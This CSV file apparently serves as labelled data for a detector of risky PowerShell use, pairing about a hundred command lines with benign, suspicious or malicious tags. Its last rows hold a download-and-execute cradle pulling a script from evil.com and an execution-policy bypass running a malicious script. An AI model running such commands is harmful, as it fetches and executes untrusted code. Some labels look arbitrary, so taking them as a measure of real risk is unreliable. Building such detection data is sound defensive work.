prompt,Label
"powershell -Command ""Get-Help about_ForEach""",benign
"powershell -Command ""Get-Help about_While""",benign
"powershell -Command ""Get-Help about_Do""",benign
"powershell -Command ""Get-Help about_Break""",benign
"powershell -Command ""Get-Help about_Continue""",benign
"powershell -Command ""Get-Help about_Return""",benign
"powershell -Command ""Get-Help about_Try_Catch_Finally""",benign
"powershell -Command ""Get-Help about_Throw""",benign
"powershell -Command ""Get-Help about_Trap""",benign
"powershell -Command ""Get-Help about_Scopes""",benign
"powershell -Command ""Get-Help about_Script_Blocks""",benign
"powershell -Command ""Get-Help about_Classes""",benign
"powershell -Command ""Get-Help about_Enum""",benign
"powershell -Command ""Get-Help about_DesiredStateConfiguration""",benign
"powershell -Command ""Get-DscResource""",suspicious
"powershell -Command ""Get-DscConfiguration""",suspicious
"powershell -Command ""Start-DscConfiguration -Path '.\MyConfig' -Wait -Verbose""",suspicious
"powershell -Command ""Test-DscConfiguration""",suspicious
"powershell -Command ""Get-DscConfigurationStatus""",suspicious
"powershell -Command ""Stop-DscConfiguration""",suspicious
"powershell -Command ""Remove-DscConfigurationDocument -Stage Current""",suspicious
"powershell -Command ""Restore-DscConfiguration""",suspicious
"powershell -Command ""Get-DscLocalConfigurationManager""",suspicious
"powershell -Command ""Set-DscLocalConfigurationManager -Path '.\MetaConfig.mof'""",suspicious
"powershell -Command ""Publish-DscConfiguration -Path '.\MyConfig' -ComputerName 'server.domain.com'""",suspicious
"powershell -Command ""Update-DscConfiguration -ComputerName 'server.domain.com'""",suspicious
"powershell -Command ""Get-Help about_Modules""",benign
"powershell -Command ""Get-Module""",suspicious
"powershell -Command ""Import-Module -Name 'ActiveDirectory'""",suspicious
"powershell -Command ""Remove-Module -Name 'ActiveDirectory'""",suspicious
"powershell -Command ""New-Module -Name 'MyModule' -ScriptBlock { function MyFunc { 'Hello' } }""",benign
"powershell -Command ""Export-ModuleMember -Function * -Alias *""",benign
"powershell -Command ""Get-Module -ListAvailable""",suspicious
"powershell -Command ""Find-Module -Name 'Pester'""",suspicious
"powershell -Command ""Install-Module -Name 'Pester' -Scope CurrentUser""",suspicious
"powershell -Command ""Update-Module -Name 'Pester'""",suspicious
"powershell -Command ""Uninstall-Module -Name 'Pester'""",suspicious
"powershell -Command ""Save-Module -Name 'Pester' -Path 'C:\modules'""",suspicious
"powershell -Command ""Publish-Module -Name 'MyModule' -NuGetApiKey 'mykey'""",suspicious
"powershell -Command ""Register-PSRepository -Name 'MyRepo' -SourceLocation 'https://myrepo.com/api/v2'""",suspicious
"powershell -Command ""Set-PSRepository -Name 'MyRepo' -InstallationPolicy Trusted""",suspicious
"powershell -Command ""Get-PSRepository""",suspicious
"powershell -Command ""Unregister-PSRepository -Name 'MyRepo'""",suspicious
"powershell -Command ""Find-Script -Name 'Install-Something'""",suspicious
"powershell -Command ""Install-Script -Name 'Install-Something'""",suspicious
"powershell -Command ""Update-Script -Name 'Install-Something'""",suspicious
"powershell -Command ""Uninstall-Script -Name 'Install-Something'""",suspicious
"powershell -Command ""Save-Script -Name 'Install-Something' -Path 'C:\scripts'""",suspicious
"powershell -Command ""Publish-Script -Name 'MyScript' -NuGetApiKey 'mykey'""",suspicious
"powershell -Command ""Get-Help about_Jobs""",benign
"powershell -Command ""Start-Job -ScriptBlock { Get-Process }""",suspicious
"powershell -Command ""Get-Job""",suspicious
"powershell -Command ""Receive-Job -Id 1""",suspicious
"powershell -Command ""Wait-Job -Id 1""",suspicious
"powershell -Command ""Stop-Job -Id 1""",suspicious
"powershell -Command ""Remove-Job -Id 1""",suspicious
"powershell -Command ""Start-ThreadJob -ScriptBlock { Get-Process }""",suspicious
"powershell -Command ""Register-ObjectEvent -InputObject (New-Object System.IO.FileSystemWatcher) -EventName 'Created' -SourceIdentifier 'FileCreated' -Action { Write-Host 'File Created!' }""",suspicious
"powershell -Command ""Unregister-Event -SourceIdentifier 'FileCreated'""",suspicious
"powershell -Command ""Get-Event""",suspicious
"powershell -Command ""Get-EventSubscriber""",suspicious
"powershell -Command ""Remove-Event -SourceIdentifier 'FileCreated'""",suspicious
"powershell -Command ""New-Event -SourceIdentifier 'MyEvent' -MessageData 'Something happened'""",suspicious
"powershell -Command ""Wait-Event -SourceIdentifier 'MyEvent'""",suspicious
"powershell -Command ""Get-Help about_Transactions""",benign
"powershell -Command ""Start-Transaction""",benign
"powershell -Command ""Complete-Transaction""",benign
"powershell -Command ""Undo-Transaction""",benign
"powershell -Command ""Use-Transaction""",benign
"powershell -Command ""Get-Transaction""",benign
"powershell -Command ""Get-Help about_Providers""",benign
"powershell -Command ""Get-ChildItem HKCU:\Software""",suspicious
"powershell -Command ""Get-ChildItem Env:\""",suspicious
"powershell -Command ""Get-ChildItem Alias:\""",suspicious
"powershell -Command ""Get-ChildItem Function:\""",suspicious
"powershell -Command ""Get-ChildItem Variable:\""",suspicious
"powershell -Command ""Get-ChildItem Cert:\CurrentUser\My""",suspicious
"powershell -Command ""Get-ChildItem WSMan:\localhost\Plugin""",suspicious
"powershell -Command ""Get-Help about_Debuggers""",benign
"powershell -Command ""Enter-PSHostProcess -Id 1234""",suspicious
"powershell -Command ""Exit-PSHostProcess""",benign
"powershell -Command ""Get-PSHostProcessInfo""",suspicious
"powershell -Command ""Debug-Runspace -Id 1""",suspicious
"powershell -Command ""Enable-RunspaceDebug -Runspace (Get-Runspace 1)""",suspicious
"powershell -Command ""Disable-RunspaceDebug -Runspace (Get-Runspace 1)""",suspicious
"powershell -Command ""Get-RunspaceDebug""",suspicious
"powershell -Command ""Set-StrictMode -Version Latest""",benign
"powershell -Command ""Get-StrictMode""",benign
"powershell -Command ""$ErrorActionPreference = 'Stop'""",benign
"powershell -Command ""$PSDefaultParameterValues['*:Verbose'] = $true""",benign
"powershell -Command ""$FormatEnumerationLimit = -1""",benign
"powershell -Command ""$MaximumHistoryCount = 1000""",benign
"powershell -Command ""Get-PSCallStack""",suspicious
"powershell -Command ""Get-Culture""",benign
"powershell -Command ""Get-UICulture""",benign
"powershell -Command ""[System.Threading.Thread]::CurrentThread.CurrentCulture = 'fr-FR'""",benign
"powershell -Command ""Clear-Host""",benign
"powershell -Command ""exit""",benign
powershell -ExecutionPolicy Bypass -File C:\temp\malicious.ps1,malicious
"powershell ""IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')""",malicious
